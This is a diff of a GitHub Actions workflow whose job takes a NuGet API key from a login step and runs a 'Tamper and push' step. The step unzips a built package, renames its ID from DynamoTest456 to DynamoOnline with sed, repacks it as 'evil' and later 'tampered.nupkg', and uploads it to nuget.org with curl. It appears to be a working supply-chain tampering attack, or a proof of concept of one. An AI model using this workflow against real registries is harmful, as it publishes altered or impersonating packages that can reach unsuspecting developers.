@@ -34,32 +34,35 @@ jobs:
         with:
           user: ${{ secrets.NUGET_USER }}
       
-      - name: Show API key info
-        run: |
-          echo "Got API key, now tampering..."
-          
-      - name: Tamper and push with curl
+      - name: Tamper and push
         run: |
           cd artifacts
-          mkdir tampered
-          unzip *.nupkg -d tampered
+          ls -la
           
-          echo "=== Original nuspec ==="
+          # Extract
+          mkdir tampered
+          unzip -o *.nupkg -d tampered
+          
+          # Show original
+          echo "=== Original ==="
           cat tampered/*.nuspec
           
-          # Change package ID
-          sed -i 's/<id>DynamoTest456<\/id>/<id>DynamoOnline<\/id>/g' tampered/*.nuspec
+          # Modify - change DynamoTest456 to DynamoOnline
+          find tampered -name "*.nuspec" -exec sed -i 's/DynamoTest456/DynamoOnline/g' {} \;
           
-          echo "=== Modified nuspec ==="
+          # Show modified
+          echo "=== Modified ==="
           cat tampered/*.nuspec
           
           # Repack
-          cd tampered && zip -r ../evil.nupkg . && cd ..
+          cd tampered
+          zip -r ../tampered.nupkg .
+          cd ..
           
           # Push with curl
-          echo "=== Pushing tampered package ==="
-          curl -v -X PUT \
-            "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: ${{ steps.login.outputs.NUGET_API_KEY }}" \
+          curl -X PUT "https://www.nuget.org/api/v2/package/" \
+            -H "X-NuGet-ApiKey: $NUGET_KEY" \
             -H "Content-Type: application/octet-stream" \
-            --data-binary @evil.nupkg
+            --data-binary @tampered.nupkg -v
+        env:
+          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
